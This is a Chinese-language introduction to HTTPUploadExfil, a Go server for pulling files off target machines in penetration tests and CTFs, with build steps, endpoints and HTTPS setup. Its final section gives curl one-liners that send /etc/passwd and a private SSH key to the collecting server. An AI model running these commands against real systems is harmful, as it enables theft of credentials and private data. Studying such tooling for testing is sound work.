![](https://image.3001.net/images/20211116/1637061749_61939475ba1372890fcdc.png!small)

## 关于HTTPUploadExfil

HTTPUploadExfil是一款简单但功能强大的HTTP服务器，该服务器基于Go语言开发，可以帮助广大研究人员轻松使用HTTP来从目标设备上收集文件数据或其他信息。该工具适用于很多的安全应用场景，比如说CTF比赛等等。

其实，我们可以把HTTPUploadExfil看作是Python中的http.server(“python3 -m
http.server”)，但HTTPUploadExfil的主要功能是远程从目标设备上提取数据，而不是在目标设备上向远程服务器发送数据。

很明显，这是一种非常方便强大但又存在一定限制的数据/文件提取方式。然而，HTTPUploadExfil的使用比SMB或FTP要更加简单。如果你正在寻找类似的工具，HTTPUploadExfil绝对是你最佳的选择。当然了，除了HTTPUploadExfil之外，社区还有[
_dnsteal_](https://github.com/m57/dnsteal)或[
_PyExfil_](https://github.com/ytisf/PyExfil)之类的工具可供选择。

## 工具下载

首先，我们需要在本地设备上安装并配置好Go语言环境，然后使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/IngoKl/HTTPUploadExfil.git

运行下列命令构建工具代码：

    
    
    go build

除此之外，我们也可以直接访问该项目的【[
_Releases页面_](https://github.com/IngoKl/HTTPUploadExfil/releases)】下载Linux或Windows版本的项目源码，不过这些版本可能更新速度比较慢，并不包含HTTPUploadExfil最新版本的功能特性。

## 构建和开发

虽然我们已经提供了完整的项目代码，但我们也建议大家动手构建自己的工具版本，这样就可以使用HTTPUploadExfil最新版本的功能特性了。

首先，我们需要在终端窗口中切换至项目根目录下，然后运行下列命令：

    
    
    go build

然后我们就能够拿到针对自己操作系统平台的httpuploadexfil可执行程序了。

如果你需要修改工具配置或功能，请运行下列命令：

    
    
    go fmt main.go

或者，你还可以使用“make”命令构建该工具，或者运行下列命令来生成SSL证书：

    
    
    make cert

## 工具操作流程

  * 使用“go build”命令构建工具代码。
  * 在我们自己的设备上运行下列命令：

    
    
    ./httpuploadexfil :1337 /home/kali/loot

  * 在需要提取过滤文件数据的目标设备中，访问下列地址：

    
    
    http://YOUR_IP:1337/

  * 此时，我们就可以在自己设备上的“/home/kali/loot”目录中查看到我们获取到的文件了。

## 工具使用

![](https://image.3001.net/images/20211116/1637061789_6193949d5ea16fbfe97d0.png!small)

默认配置下，HTTPUploadExfil将会在8080端口上运行，所有的文件都会被写入至当前目录：

    
    
    ./httpuploadexfil

我们还可以指定某些运行参数：

    
    
    ./httpuploadexfil :1337 /home/kali/loot

第一个参数是绑定的地址，第二个参数为存储文件的目录地址。

## 终端节点

Web服务器会暴露四个终端节点供我们使用：

  * /（GET）：上传表单。
  * /p（POST）：从上传表单中获取数据，它要求使用带有“file”表单字段的multipart/form-data请求。
  * /g（GET）：获取任意GET请求并在服务器上存储完整的请求信息。
  * /l（GET）：提供指定目录文件夹中的文件访问权，并提供基础的“python3 -m http.server”功能。

## HTTPs模式

HTTPUploadExfil
还能够以HTTPs模式运行，此时我们需要在项目代码文件中存储一个HTTPUploadExfil.csr和一个HTTPUploadExfil.key文件即可。我们可以通过下列命令生成这两个文件：

    
    
    openssl req -new -newkey rsa:2048 -nodes -keyout HTTPUploadExfil.key -out HTTPUploadExfil.csr
    
    openssl x509 -req -days 365 -in HTTPUploadExfil.csr -signkey HTTPUploadExfil.key -out HTTPUploadExfil.csr

或者，使用下列命令完成证书生成：

    
    
    make cert

如果服务器检测到了HTTPUploadExfil.csr文件，它将会尝试开启HTTPs模式。如果需要切换回HTTP模式，请直接删除或重命名证书文件即可。

## Shell

在Bash的帮助下，我们可以使用GET请求来实现文件数据的提取和过滤，比如说：

    
    
    echo "data=`cat /etc/passwd`" | curl -d @- http://127.0.0.1:8080/g

当然了，我们同样可以使用curl来实现文件数据的提取和过滤：

    
    
    curl -F file=@/home/kali/.ssh/id_rsa http://127.0.0.1:8080/p

## 项目地址

 **HTTPUploadExfil：** 【[
_GitHub传送门_](https://github.com/IngoKl/HTTPUploadExfil)】

